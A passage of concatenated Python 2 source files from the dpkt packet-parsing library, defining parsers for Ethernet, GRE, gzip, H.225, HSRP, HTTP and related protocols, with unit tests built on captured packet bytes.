        hexa = ' '.join(['%02x' % ord(x) for x in line])
        line = line.translate(__vis_filter)
        res.append('  %04d:  %-*s %s' % (n, length * 3, hexa, line))
        n += length
    return '\n'.join(res)

try:
    import dnet
    def in_cksum_add(s, buf):
        return dnet.ip_cksum_add(buf, s)
    def in_cksum_done(s):
        return socket.ntohs(dnet.ip_cksum_carry(s))
except ImportError:
    import array
    def in_cksum_add(s, buf):
        n = len(buf)
        cnt = (n / 2) * 2
        a = array.array('H', buf[:cnt])
        if cnt != n:
            a.append(struct.unpack('H', buf[-1] + '\x00')[0])
        return s + sum(a)
    def in_cksum_done(s):
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return socket.ntohs(~s & 0xffff)

def in_cksum(buf):
    """Return computed Internet checksum."""
    return in_cksum_done(in_cksum_add(0, buf))

########NEW FILE########
__FILENAME__ = dtp
# $Id: dtp.py 23 2006-11-08 15:45:33Z dugsong $

"""Dynamic Trunking Protocol."""

import struct
import dpkt

class DTP(dpkt.Packet):
    __hdr__ = (
        ('v', 'B', 0),
        ) # rest is TLVs
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        buf = self.data
        tvs = []
        while buf:
            t, l = struct.unpack('>HH', buf[:4])
            v, buf = buf[4:4+l], buf[4+l:]
            tvs.append((t, v))
        self.data = tvs

TRUNK_NAME = 0x01
MAC_ADDR = 0x04

########NEW FILE########
__FILENAME__ = esp
# $Id: esp.py 23 2006-11-08 15:45:33Z dugsong $

"""Encapsulated Security Protocol."""

import dpkt

class ESP(dpkt.Packet):
    __hdr__ = (
        ('spi', 'I', 0),
        ('seq', 'I', 0)
        )

########NEW FILE########
__FILENAME__ = ethernet
# $Id: ethernet.py 65 2010-03-26 02:53:51Z dugsong $

"""Ethernet II, LLC (802.3+802.2), LLC/SNAP, and Novell raw 802.3,
with automatic 802.1q, MPLS, PPPoE, and Cisco ISL decapsulation."""

import struct
import dpkt, stp

ETH_CRC_LEN	= 4
ETH_HDR_LEN	= 14

ETH_LEN_MIN	= 64		# minimum frame length with CRC
ETH_LEN_MAX	= 1518		# maximum frame length with CRC

ETH_MTU		= (ETH_LEN_MAX - ETH_HDR_LEN - ETH_CRC_LEN)
ETH_MIN		= (ETH_LEN_MIN - ETH_HDR_LEN - ETH_CRC_LEN)

# Ethernet payload types - http://standards.ieee.org/regauth/ethertype
ETH_TYPE_PUP	= 0x0200		# PUP protocol
ETH_TYPE_IP	= 0x0800		# IP protocol
ETH_TYPE_ARP	= 0x0806		# address resolution protocol
ETH_TYPE_CDP	= 0x2000		# Cisco Discovery Protocol
ETH_TYPE_DTP	= 0x2004		# Cisco Dynamic Trunking Protocol
ETH_TYPE_REVARP	= 0x8035		# reverse addr resolution protocol
ETH_TYPE_8021Q	= 0x8100		# IEEE 802.1Q VLAN tagging
ETH_TYPE_IPX	= 0x8137		# Internetwork Packet Exchange
ETH_TYPE_IP6	= 0x86DD		# IPv6 protocol
ETH_TYPE_PPP	= 0x880B		# PPP
ETH_TYPE_MPLS	= 0x8847		# MPLS
ETH_TYPE_MPLS_MCAST	= 0x8848	# MPLS Multicast
ETH_TYPE_PPPoE_DISC	= 0x8863	# PPP Over Ethernet Discovery Stage
ETH_TYPE_PPPoE		= 0x8864	# PPP Over Ethernet Session Stage

# MPLS label stack fields
MPLS_LABEL_MASK	= 0xfffff000
MPLS_QOS_MASK	= 0x00000e00
MPLS_TTL_MASK	= 0x000000ff
MPLS_LABEL_SHIFT= 12
MPLS_QOS_SHIFT	= 9
MPLS_TTL_SHIFT	= 0
MPLS_STACK_BOTTOM=0x0100

class Ethernet(dpkt.Packet):
    __hdr__ = (
        ('dst', '6s', ''),
        ('src', '6s', ''),
        ('type', 'H', ETH_TYPE_IP)
        )
    _typesw = {}
    
    def _unpack_data(self, buf):
        if self.type == ETH_TYPE_8021Q:
            self.tag, self.type = struct.unpack('>HH', buf[:4])
            buf = buf[4:]
        elif self.type == ETH_TYPE_MPLS or \
             self.type == ETH_TYPE_MPLS_MCAST:
            # XXX - skip labels (max # of labels is undefined, just use 24)
            self.labels = []
            for i in range(24):
                entry = struct.unpack('>I', buf[i*4:i*4+4])[0]
                label = ((entry & MPLS_LABEL_MASK) >> MPLS_LABEL_SHIFT, \
                         (entry & MPLS_QOS_MASK) >> MPLS_QOS_SHIFT, \
                         (entry & MPLS_TTL_MASK) >> MPLS_TTL_SHIFT)
                self.labels.append(label)
                if entry & MPLS_STACK_BOTTOM:
                    break
            self.type = ETH_TYPE_IP
            buf = buf[(i + 1) * 4:]
        try:
            self.data = self._typesw[self.type](buf)
            setattr(self, self.data.__class__.__name__.lower(), self.data)
        except (KeyError, dpkt.UnpackError):
            self.data = buf
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        if self.type > 1500:
            # Ethernet II
            self._unpack_data(self.data)
        elif self.dst.startswith('\x01\x00\x0c\x00\x00') or \
             self.dst.startswith('\x03\x00\x0c\x00\x00'):
            # Cisco ISL
            self.vlan = struct.unpack('>H', self.data[6:8])[0]
            self.unpack(self.data[12:])
        elif self.data.startswith('\xff\xff'):
            # Novell "raw" 802.3
            self.type = ETH_TYPE_IPX
            self.data = self.ipx = self._typesw[ETH_TYPE_IPX](self.data[2:])
        else:
            # 802.2 LLC
            self.dsap, self.ssap, self.ctl = struct.unpack('BBB', self.data[:3])
            if self.data.startswith('\xaa\xaa'):
                # SNAP
                self.type = struct.unpack('>H', self.data[6:8])[0]
                self._unpack_data(self.data[8:])
            else:
                # non-SNAP
                dsap = ord(self.data[0])
                if dsap == 0x06: # SAP_IP
                    self.data = self.ip = self._typesw[ETH_TYPE_IP](self.data[3:])
                elif dsap == 0x10 or dsap == 0xe0: # SAP_NETWARE{1,2}
                    self.data = self.ipx = self._typesw[ETH_TYPE_IPX](self.data[3:])
                elif dsap == 0x42: # SAP_STP
                    self.data = self.stp = stp.STP(self.data[3:])

    def set_type(cls, t, pktclass):
        cls._typesw[t] = pktclass
    set_type = classmethod(set_type)

    def get_type(cls, t):
        return cls._typesw[t]
    get_type = classmethod(get_type)

# XXX - auto-load Ethernet dispatch table from ETH_TYPE_* definitions
def __load_types():
    g = globals()
    for k, v in g.iteritems():
        if k.startswith('ETH_TYPE_'):
            name = k[9:]
            modname = name.lower()
            try:
                mod = __import__(modname, g)
            except ImportError:
                continue
            Ethernet.set_type(v, getattr(mod, name))

if not Ethernet._typesw:
    __load_types()

if __name__ == '__main__':
    import unittest

    class EthTestCase(unittest.TestCase):
        def test_eth(self):
            s = '\x00\xb0\xd0\xe1\x80r\x00\x11$\x8c\x11\xde\x86\xdd`\x00\x00\x00\x00(\x06@\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x11$\xff\xfe\x8c\x11\xde\xfe\x80\x00\x00\x00\x00\x00\x00\x02\xb0\xd0\xff\xfe\xe1\x80r\xcd\xd3\x00\x16\xffP\xd7\x13\x00\x00\x00\x00\xa0\x02\xff\xffg\xd3\x00\x00\x02\x04\x05\xa0\x01\x03\x03\x00\x01\x01\x08\n}\x18:a\x00\x00\x00\x00'
            eth = Ethernet(s)

    unittest.main()

########NEW FILE########
__FILENAME__ = gre
# $Id: gre.py 30 2007-01-27 03:10:09Z dugsong $

"""Generic Routing Encapsulation."""

import struct
import dpkt

GRE_CP = 0x8000  # Checksum Present
GRE_RP = 0x4000  # Routing Present
GRE_KP = 0x2000  # Key Present
GRE_SP = 0x1000  # Sequence Present
GRE_SS = 0x0800  # Strict Source Route
GRE_AP = 0x0080  # Acknowledgment Present

GRE_opt_fields = (
    (GRE_CP|GRE_RP, 'sum', 'H'), (GRE_CP|GRE_RP, 'off', 'H'),
    (GRE_KP, 'key', 'I'), (GRE_SP, 'seq', 'I'), (GRE_AP, 'ack', 'I')
    )
class GRE(dpkt.Packet):
    __hdr__ = (
        ('flags', 'H', 0),
        ('p', 'H', 0x0800), # ETH_TYPE_IP
        )
    _protosw = {}
    sre = ()
    def get_v(self):
        return self.flags & 0x7
    def set_v(self, v):
        self.flags = (self.flags & ~0x7) | (v & 0x7)
    v = property(get_v, set_v)

    def get_recur(self):
        return (self.flags >> 5) & 0x7
    def set_recur(self, v):
        self.flags = (self.flags & ~0xe0) | ((v & 0x7) << 5)
    recur = property(get_recur, set_recur)
    
    class SRE(dpkt.Packet):
        __hdr__ = [
            ('family', 'H', 0),
            ('off', 'B', 0),
            ('len', 'B', 0)
            ]
        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            self.data = self.data[:self.len]

    def opt_fields_fmts(self):
        if self.v == 0:
            fields, fmts = [], []
            opt_fields = GRE_opt_fields
        else:
            fields, fmts = [ 'len', 'callid' ], [ 'H', 'H' ]
            opt_fields = GRE_opt_fields[-2:]
        for flags, field, fmt in opt_fields:
            if self.flags & flags:
                fields.append(field)
                fmts.append(fmt)
        return fields, fmts
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        fields, fmts = self.opt_fields_fmts()
        if fields:
            fmt = ''.join(fmts)
            fmtlen = struct.calcsize(fmt)
            vals = struct.unpack(fmt, self.data[:fmtlen])
            self.data = self.data[fmtlen:]
            self.__dict__.update(dict(zip(fields, vals)))
        if self.flags & GRE_RP:
            l = []
            while True:
                sre = self.SRE(self.data)
                l.append(sre)
                if not sre.len:
                    break
            self.sre = l
            skip = sum(map(len, self.sre))
            self.data = self.data[skip:]
        self.data = ethernet.Ethernet._typesw[self.p](self.data)
        setattr(self, self.data.__class__.__name__.lower(), self.data)
    
    def __len__(self):
        opt_fmtlen = struct.calcsize(''.join(self.opt_fields_fmts()[1]))
        return self.__hdr_len__ + opt_fmtlen + \
               sum(map(len, self.sre)) + len(self.data)

    # XXX - need to fix up repr to display optional fields...
    
    def __str__(self):
        fields, fmts = self.opt_fields_fmts()
        if fields:
            vals = []
            for f in fields:
                vals.append(getattr(self, f))
            opt_s = struct.pack(''.join(fmts), *vals)
        else:
            opt_s = ''
        return self.pack_hdr() + opt_s + ''.join(map(str, self.sre)) + \
               str(self.data)

# XXX - auto-load GRE dispatch table from Ethernet dispatch table
import ethernet
GRE._protosw.update(ethernet.Ethernet._typesw)

########NEW FILE########
__FILENAME__ = gzip
# $Id: gzip.py 23 2006-11-08 15:45:33Z dugsong $

"""GNU zip."""

import struct, zlib
import dpkt

# RFC 1952
GZIP_MAGIC	= '\x1f\x8b'

# Compression methods
GZIP_MSTORED	= 0
GZIP_MCOMPRESS	= 1
GZIP_MPACKED	= 2
GZIP_MLZHED	= 3
GZIP_MDEFLATE	= 8

# Flags
GZIP_FTEXT	= 0x01
GZIP_FHCRC	= 0x02
GZIP_FEXTRA	= 0x04
GZIP_FNAME	= 0x08
GZIP_FCOMMENT	= 0x10
GZIP_FENCRYPT	= 0x20
GZIP_FRESERVED	= 0xC0

# OS
GZIP_OS_MSDOS	= 0
GZIP_OS_AMIGA	= 1
GZIP_OS_VMS	= 2
GZIP_OS_UNIX	= 3
GZIP_OS_VMCMS	= 4
GZIP_OS_ATARI	= 5
GZIP_OS_OS2	= 6
GZIP_OS_MACOS	= 7
GZIP_OS_ZSYSTEM	= 8
GZIP_OS_CPM	= 9
GZIP_OS_TOPS20	= 10
GZIP_OS_WIN32	= 11
GZIP_OS_QDOS	= 12
GZIP_OS_RISCOS	= 13
GZIP_OS_UNKNOWN	= 255

GZIP_FENCRYPT_LEN	= 12

class GzipExtra(dpkt.Packet):
    __hdr__ = (
        ('id', '2s', ''),
        ('len', 'H', 0)
        )

class Gzip(dpkt.Packet):
    __hdr__ = (
        ('magic', '2s', GZIP_MAGIC),
        ('method', 'B', GZIP_MDEFLATE),
        ('flags', 'B', 0),
        ('mtime', 'I', 0),
        ('xflags', 'B', 0),
        ('os', 'B', GZIP_OS_UNIX),
        
        ('extra', '0s', ''),	# XXX - GZIP_FEXTRA
        ('filename', '0s', ''),	# XXX - GZIP_FNAME
        ('comment', '0s', '')	# XXX - GZIP_FCOMMENT
        )
    
    def unpack(self, buf):
        super(Gzip, self).unpack(buf)
        if self.flags & GZIP_FEXTRA:
            n = struct.unpack(self.data[:2], '>H')[0]
            self.extra = GzipExtra(self.data[2:2+n])
            self.data = self.data[2+n:]
        if self.flags & GZIP_FNAME:
            n = self.data.find('\x00')
            self.filename = self.data[:n]
            self.data = self.data[n + 1:]
        if self.flags & GZIP_FCOMMENT:
            n = self.data.find('\x00')
            self.comment = self.data[:n]
            self.data = self.data[n + 1:]
        if self.flags & GZIP_FENCRYPT:
            self.data = self.data[GZIP_FENCRYPT_LEN:]	# XXX - skip
        if self.flags & GZIP_FHCRC:
            self.data = self.data[2:]	# XXX - skip

    def pack_hdr(self):
        l = []
        if self.extra:
            self.flags |= GZIP_FEXTRA
            s = str(self.extra)
            l.append(struct.pack('>H', len(s)))
            l.append(s)
        if self.filename:
            self.flags |= GZIP_FNAME
            l.append(self.filename)
            l.append('\x00')
        if self.comment:
            self.flags |= GZIP_FCOMMENT
            l.append(self.comment)
            l.append('\x00')
        l.insert(0, super(Gzip, self).pack_hdr())
        return ''.join(l)

    def compress(self):
        """Compress self.data."""
        c = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS,
                             zlib.DEF_MEM_LEVEL, 0)
        self.data = c.compress(self.data)
    
    def decompress(self):
        """Return decompressed payload."""
        d = zlib.decompressobj(-zlib.MAX_WBITS)
        return d.decompress(self.data)

if __name__ == '__main__':
    import sys
    gz = Gzip(open(sys.argv[1]).read())
    print `gz`, `gz.decompress()`

########NEW FILE########
__FILENAME__ = h225
# $Id: h225.py 23 2006-11-08 15:45:33Z dugsong $

"""ITU-T H.225.0 Call Signaling."""

import dpkt, tpkt
import struct

# H225 Call Signaling
# 
# Call messages and information elements (IEs) are defined by Q.931:
# http://cvsup.de.openbsd.org/historic/comp/doc/standards/itu/Q/Q.931.ps.gz
#
# The User-to-User IEs of H225 are encoded by PER of ASN.1.

# Call Establishment Messages
ALERTING				= 1
CALL_PROCEEDING				= 2
CONNECT					= 7
CONNECT_ACKNOWLEDGE			= 15
PROGRESS				= 3
SETUP					= 5
SETUP_ACKNOWLEDGE			= 13

# Call Information Phase Messages
RESUME					= 38
RESUME_ACKNOWLEDGE			= 46
RESUME_REJECT				= 34
SUSPEND					= 37
SUSPEND_ACKNOWLEDGE			= 45
SUSPEND_REJECT				= 33
USER_INFORMATION			= 32

# Call Clearing Messages
DISCONNECT				= 69
RELEASE					= 77
RELEASE_COMPLETE			= 90
RESTART					= 70
RESTART_ACKNOWLEDGE			= 78

# Miscellaneous Messages
SEGMENT					= 96
CONGESTION_CONTROL			= 121
INFORMATION				= 123
NOTIFY					= 110
STATUS					= 125
STATUS_ENQUIRY				= 117

# Type 1 Single Octet Information Element IDs
RESERVED				= 128
SHIFT					= 144
CONGESTION_LEVEL			= 176
REPEAT_INDICATOR			= 208

# Type 2 Single Octet Information Element IDs
MORE_DATA				= 160
SENDING_COMPLETE			= 161

# Variable Length Information Element IDs 
SEGMENTED_MESSAGE			= 0
BEARER_CAPABILITY			= 4
CAUSE					= 8
CALL_IDENTITY				= 16
CALL_STATE				= 20
CHANNEL_IDENTIFICATION			= 24
PROGRESS_INDICATOR			= 30
NETWORK_SPECIFIC_FACILITIES		= 32
NOTIFICATION_INDICATOR			= 39
DISPLAY					= 40
DATE_TIME				= 41
KEYPAD_FACILITY				= 44
SIGNAL					= 52
INFORMATION_RATE			= 64
END_TO_END_TRANSIT_DELAY		= 66
TRANSIT_DELAY_SELECTION_AND_INDICATION	= 67
PACKET_LAYER_BINARY_PARAMETERS		= 68
PACKET_LAYER_WINDOW_SIZE		= 69
PACKET_SIZE				= 70
CLOSED_USER_GROUP			= 71
REVERSE_CHARGE_INDICATION		= 74
CALLING_PARTY_NUMBER			= 108
CALLING_PARTY_SUBADDRESS		= 109
CALLED_PARTY_NUMBER			= 112
CALLED_PARTY_SUBADDRESS			= 113
REDIRECTING_NUMBER			= 116
TRANSIT_NETWORK_SELECTION		= 120
RESTART_INDICATOR			= 121
LOW_LAYER_COMPATIBILITY			= 124
HIGH_LAYER_COMPATIBILITY		= 125
USER_TO_USER				= 126
ESCAPE_FOR_EXTENSION			= 127

class H225(dpkt.Packet):
    __hdr__ = (
        ('proto', 'B', 8),
        ('ref_len', 'B', 2)
        )

    def unpack(self, buf):
        # TPKT header
        self.tpkt = tpkt.TPKT(buf)
        if self.tpkt.v != 3: 
            raise dpkt.UnpackError('invalid TPKT version')
        if self.tpkt.rsvd != 0:
            raise dpkt.UnpackError('invalid TPKT reserved value')
        n = self.tpkt.len - self.tpkt.__hdr_len__
        if n > len(self.tpkt.data):
            raise dpkt.UnpackError('invalid TPKT length')
        buf = self.tpkt.data

        # Q.931 payload
        dpkt.Packet.unpack(self, buf)
        buf = buf[self.__hdr_len__:]
        self.ref_val = buf[:self.ref_len]
        buf = buf[self.ref_len:]
        self.type = struct.unpack('B', buf[:1])[0]
        buf = buf[1:]

        # Information Elements
        l = []
        while buf:
            ie = self.IE(buf)
            l.append(ie)
            buf = buf[len(ie):]
        self.data = l

    def __len__(self):
        return self.tpkt.__hdr_len__ + \
               self.__hdr_len__ + \
               sum(map(len, self.data))

    def __str__(self):
        return self.tpkt.pack_hdr() + \
               self.pack_hdr() + \
               self.ref_val + \
               struct.pack('B', self.type) + \
               ''.join(map(str, self.data))

    class IE(dpkt.Packet):
        __hdr__ = (
            ('type', 'B', 0),
            )

        def unpack(self, buf):
            dpkt.Packet.unpack(self, buf)
            buf = buf[self.__hdr_len__:]

            # single-byte IE
            if self.type & 0x80:
                self.len = 0
                self.data = None
            # multi-byte IE
            else:
                # special PER-encoded UUIE
                if self.type == USER_TO_USER:
                    self.len = struct.unpack('>H', buf[:2])[0]
                    buf = buf[2:]
                # normal TLV-like IE
                else:
                    self.len = struct.unpack('B', buf[:1])[0]
                    buf = buf[1:]
                self.data = buf[:self.len]

        def __len__(self):
            if self.type & 0x80:
                n = 0
            else:
                if self.type == USER_TO_USER:
                    n = 2
                else:
                    n = 1
            return self.__hdr_len__ + \
                   self.len \
                   + n

        def __str__(self):
            if self.type & 0x80:
                length_str = None
            else:
                if self.type == USER_TO_USER:
                    length_str = struct.pack('>H', self.len) 
                else:
                    length_str = struct.pack('B', self.len)
            return struct.pack('B', self.type) + \
                   length_str + \
                   self.data


if __name__ == '__main__':
    import unittest

    class H225TestCase(unittest.TestCase):
        def testPack(self):
            h = H225(self.s)
            self.failUnless(self.s == str(h))

        def testUnpack(self):
            h = H225(self.s)
            self.failUnless(h.tpkt.v == 3)
            self.failUnless(h.tpkt.rsvd == 0)
            self.failUnless(h.tpkt.len == 1041)
            self.failUnless(h.proto == 8)
            self.failUnless(h.type == SETUP)
            self.failUnless(len(h.data) == 3)

            ie = h.data[0]
            self.failUnless(ie.type == BEARER_CAPABILITY)
            self.failUnless(ie.len == 3)
            ie = h.data[1]
            self.failUnless(ie.type == DISPLAY)
            self.failUnless(ie.len == 14)
            ie = h.data[2]
            self.failUnless(ie.type == USER_TO_USER)
            self.failUnless(ie.len == 1008)

        s = '\x03\x00\x04\x11\x08\x02\x54\x2b\x05\x04\x03\x88\x93\xa5\x28\x0e\x4a\x6f\x6e\x20\x4f\x62\x65\x72\x68\x65\x69\x64\x65\x00\x7e\x03\xf0\x05\x20\xb8\x06\x00\x08\x91\x4a\x00\x04\x01\x40\x0c\x00\x4a\x00\x6f\x00\x6e\x00\x20\x00\x4f\x00\x62\x00\x65\x00\x72\x00\x68\x00\x65\x00\x69\x00\x64\x00\x65\x22\xc0\x09\x00\x00\x3d\x06\x65\x6b\x69\x67\x61\x00\x00\x14\x32\x2e\x30\x2e\x32\x20\x28\x4f\x50\x41\x4c\x20\x76\x32\x2e\x32\x2e\x32\x29\x00\x00\x00\x01\x40\x15\x00\x74\x00\x63\x00\x70\x00\x24\x00\x68\x00\x33\x00\x32\x00\x33\x00\x2e\x00\x76\x00\x6f\x00\x78\x00\x67\x00\x72\x00\x61\x00\x74\x00\x69\x00\x61\x00\x2e\x00\x6f\x00\x72\x00\x67\x00\x42\x87\x23\x2c\x06\xb8\x00\x6a\x8b\x1d\x0c\xb7\x06\xdb\x11\x9e\xca\x00\x10\xa4\x89\x6d\x6a\x00\xc5\x1d\x80\x04\x07\x00\x0a\x00\x01\x7a\x75\x30\x11\x00\x5e\x88\x1d\x0c\xb7\x06\xdb\x11\x9e\xca\x00\x10\xa4\x89\x6d\x6a\x82\x2b\x0e\x30\x40\x00\x00\x06\x04\x01\x00\x4c\x10\x09\x00\x00\x3d\x0f\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x57\x69\x64\x65\x36\x80\x11\x1c\x00\x01\x00\x98\xa0\x26\x41\x13\x8a\x00\x98\xa0\x26\x41\x13\x8b\x26\x00\x00\x64\x0c\x10\x09\x00\x00\x3d\x0f\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x57\x69\x64\x65\x36\x80\x0b\x0d\x00\x01\x00\x98\xa0\x26\x41\x13\x8b\x00\x2a\x40\x00\x00\x06\x04\x01\x00\x4c\x10\x09\x00\x00\x3d\x09\x69\x4c\x42\x43\x2d\x31\x33\x6b\x33\x80\x11\x1c\x00\x01\x00\x98\xa0\x26\x41\x13\x8a\x00\x98\xa0\x26\x41\x13\x8b\x20\x00\x00\x65\x0c\x10\x09\x00\x00\x3d\x09\x69\x4c\x42\x43\x2d\x31\x33\x6b\x33\x80\x0b\x0d\x00\x01\x00\x98\xa0\x26\x41\x13\x8b\x00\x20\x40\x00\x00\x06\x04\x01\x00\x4e\x0c\x03\x00\x83\x00\x80\x11\x1c\x00\x01\x00\x98\xa0\x26\x41\x13\x8a\x00\x98\xa0\x26\x41\x13\x8b\x16\x00\x00\x66\x0e\x0c\x03\x00\x83\x00\x80\x0b\x0d\x00\x01\x00\x98\xa0\x26\x41\x13\x8b\x00\x4b\x40\x00\x00\x06\x04\x01\x00\x4c\x10\xb5\x00\x53\x4c\x2a\x02\x00\x00\x00\x00\x00\x40\x01\x00\x00\x40\x01\x02\x00\x08\x00\x00\x00\x00\x00\x31\x00\x01\x00\x40\x1f\x00\x00\x59\x06\x00\x00\x41\x00\x00\x00\x02\x00\x40\x01\x00\x00\x80\x11\x1c\x00\x01\x00\x98\xa0\x26\x41\x13\x8a\x00\x98\xa0\x26\x41\x13\x8b\x41\x00\x00\x67\x0c\x10\xb5\x00\x53\x4c\x2a\x02\x00\x00\x00\x00\x00\x40\x01\x00\x00\x40\x01\x02\x00\x08\x00\x00\x00\x00\x00\x31\x00\x01\x00\x40\x1f\x00\x00\x59\x06\x00\x00\x41\x00\x00\x00\x02\x00\x40\x01\x00\x00\x80\x0b\x0d\x00\x01\x00\x98\xa0\x26\x41\x13\x8b\x00\x32\x40\x00\x00\x06\x04\x01\x00\x4c\x10\x09\x00\x00\x3d\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4e\x61\x72\x72\x6f\x77\x33\x80\x11\x1c\x00\x01\x00\x98\xa0\x26\x41\x13\x8a\x00\x98\xa0\x26\x41\x13\x8b\x28\x00\x00\x68\x0c\x10\x09\x00\x00\x3d\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4e\x61\x72\x72\x6f\x77\x33\x80\x0b\x0d\x00\x01\x00\x98\xa0\x26\x41\x13\x8b\x00\x1d\x40\x00\x00\x06\x04\x01\x00\x4c\x60\x1d\x80\x11\x1c\x00\x01\x00\x98\xa0\x26\x41\x13\x8a\x00\x98\xa0\x26\x41\x13\x8b\x13\x00\x00\x69\x0c\x60\x1d\x80\x0b\x0d\x00\x01\x00\x98\xa0\x26\x41\x13\x8b\x00\x1d\x40\x00\x00\x06\x04\x01\x00\x4c\x20\x1d\x80\x11\x1c\x00\x01\x00\x98\xa0\x26\x41\x13\x8a\x00\x98\xa0\x26\x41\x13\x8b\x13\x00\x00\x6a\x0c\x20\x1d\x80\x0b\x0d\x00\x01\x00\x98\xa0\x26\x41\x13\x8b\x00\x01\x00\x01\x00\x01\x00\x01\x00\x81\x03\x02\x80\xf8\x02\x70\x01\x06\x00\x08\x81\x75\x00\x0b\x80\x13\x80\x01\xf4\x00\x01\x00\x00\x01\x00\x00\x01\x00\x00\x0c\xc0\x01\x00\x01\x80\x0b\x80\x00\x00\x20\x20\x09\x00\x00\x3d\x0f\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x57\x69\x64\x65\x36\x80\x00\x01\x20\x20\x09\x00\x00\x3d\x09\x69\x4c\x42\x43\x2d\x31\x33\x6b\x33\x80\x00\x02\x24\x18\x03\x00\xe6\x00\x80\x00\x03\x20\x20\xb5\x00\x53\x4c\x2a\x02\x00\x00\x00\x00\x00\x40\x01\x00\x00\x40\x01\x02\x00\x08\x00\x00\x00\x00\x00\x31\x00\x01\x00\x40\x1f\x00\x00\x59\x06\x00\x00\x41\x00\x00\x00\x02\x00\x40\x01\x00\x00\x80\x00\x04\x20\x20\x09\x00\x00\x3d\x11\x53\x70\x65\x65\x78\x20\x62\x73\x34\x20\x4e\x61\x72\x72\x6f\x77\x33\x80\x00\x05\x20\xc0\xef\x80\x00\x06\x20\x40\xef\x80\x00\x07\x08\xe0\x03\x51\x00\x80\x01\x00\x80\x00\x08\x08\xd0\x03\x51\x00\x80\x01\x00\x80\x00\x09\x83\x01\x50\x80\x00\x0a\x83\x01\x10\x80\x00\x0b\x83\x01\x40\x00\x80\x01\x03\x06\x00\x00\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x06\x01\x00\x07\x00\x08\x00\x00\x09\x01\x00\x0a\x00\x0b\x07\x01\x00\x32\x80\xa6\xff\x4c\x02\x80\x01\x80'

    unittest.main()

########NEW FILE########
__FILENAME__ = hsrp
# $Id: hsrp.py 23 2006-11-08 15:45:33Z dugsong $

"""Cisco Hot Standby Router Protocol."""

import dpkt

# Opcodes
HELLO = 0
COUP = 1
RESIGN = 2

# States
INITIAL = 0x00
LEARN = 0x01
LISTEN = 0x02
SPEAK = 0x04
STANDBY = 0x08
ACTIVE = 0x10

class HSRP(dpkt.Packet):
    __hdr__ = (
        ('version', 'B', 0),
        ('opcode', 'B', 0),
        ('state', 'B', 0),
        ('hello', 'B', 0),
        ('hold', 'B', 0),
        ('priority', 'B', 0),
        ('group', 'B', 0),
        ('rsvd', 'B', 0),
        ('auth', '8s', 'cisco'),
        ('vip', '4s', '')
    )

########NEW FILE########
__FILENAME__ = http
# $Id: http.py 59 2010-03-24 15:31:17Z jon.oberheide $

"""Hypertext Transfer Protocol."""

import cStringIO
import dpkt

def parse_headers(f):
    """Return dict of HTTP headers parsed from a file object."""
    d = {}
    while 1:
        line = f.readline()
        if not line:
            raise dpkt.NeedData('premature end of headers')
        line = line.strip()
        if not line:
            break
        l = line.split(None, 1)
        if not l[0].endswith(':'):
            raise dpkt.UnpackError('invalid header: %r' % line)
        k = l[0][:-1].lower()
        v = len(l) != 1 and l[1] or ''
        if k in d:
            if not type(d[k]) is list:
                d[k] = [d[k]]
            d[k].append(v)
        else:
            d[k] = v
    return d

def parse_body(f, headers):
    """Return HTTP body parsed from a file object, given HTTP header dict."""
    if headers.get('transfer-encoding', '').lower() == 'chunked':
        l = []
        found_end = False
        while 1:
            try:
                sz = f.readline().split(None, 1)[0]
            except IndexError:
                raise dpkt.UnpackError('missing chunk size')
            n = int(sz, 16)
            if n == 0:
                found_end = True
            buf = f.read(n)
            if f.readline().strip():
                break
            if n and len(buf) == n:
                l.append(buf)
            else:
                break
        if not found_end:
            raise dpkt.NeedData('premature end of chunked body')
        body = ''.join(l)
    elif 'content-length' in headers:
        n = int(headers['content-length'])
        body = f.read(n)
        if len(body) != n:
            raise dpkt.NeedData('short body (missing %d bytes)' % (n - len(body)))
    elif 'content-type' in headers:
        body = f.read()
    else:
        # XXX - need to handle HTTP/0.9
        body = ''
    return body

class Message(dpkt.Packet):
    """Hypertext Transfer Protocol headers + body."""
    __metaclass__ = type
    __hdr_defaults__ = {}
    headers = None
    body = None
    
    def __init__(self, *args, **kwargs):
        if args:
            self.unpack(args[0])
        else:
            self.headers = {}
            self.body = ''
            for k, v in self.__hdr_defaults__.iteritems():
                setattr(self, k, v)
            for k, v in kwargs.iteritems():
                setattr(self, k, v)
    
    def unpack(self, buf):
        f = cStringIO.StringIO(buf)
        # Parse headers
        self.headers = parse_headers(f)
        # Parse body
        self.body = parse_body(f, self.headers)
        # Save the rest
        self.data = f.read()

    def pack_hdr(self):
        return ''.join([ '%s: %s\r\n' % t for t in self.headers.iteritems() ])
    
    def __len__(self):
        return len(str(self))
    
    def __str__(self):
        return '%s\r\n%s' % (self.pack_hdr(), self.body)

class Request(Message):
    """Hypertext Transfer Protocol Request."""
    __hdr_defaults__ = {
        'method':'GET',
        'uri':'/',
        'version':'1.0',
        }
    __methods = dict.fromkeys((
        'GET', 'PUT', 'ICY',
        'COPY', 'HEAD', 'LOCK', 'MOVE', 'POLL', 'POST',
        'BCOPY', 'BMOVE', 'MKCOL', 'TRACE', 'LABEL', 'MERGE',
        'DELETE', 'SEARCH', 'UNLOCK', 'REPORT', 'UPDATE', 'NOTIFY',
        'BDELETE', 'CONNECT', 'OPTIONS', 'CHECKIN',
        'PROPFIND', 'CHECKOUT', 'CCM_POST',
        'SUBSCRIBE', 'PROPPATCH', 'BPROPFIND',
        'BPROPPATCH', 'UNCHECKOUT', 'MKACTIVITY',
        'MKWORKSPACE', 'UNSUBSCRIBE', 'RPC_CONNECT',
        'VERSION-CONTROL',
        'BASELINE-CONTROL'
        ))
    __proto = 'HTTP'

    def unpack(self, buf):
        f = cStringIO.StringIO(buf)
        line = f.readline()
        l = line.strip().split()
        if len(l) != 3 or l[0] not in self.__methods or \
           not l[2].startswith(self.__proto):
            raise dpkt.UnpackError('invalid request: %r' % line)
        self.method = l[0]
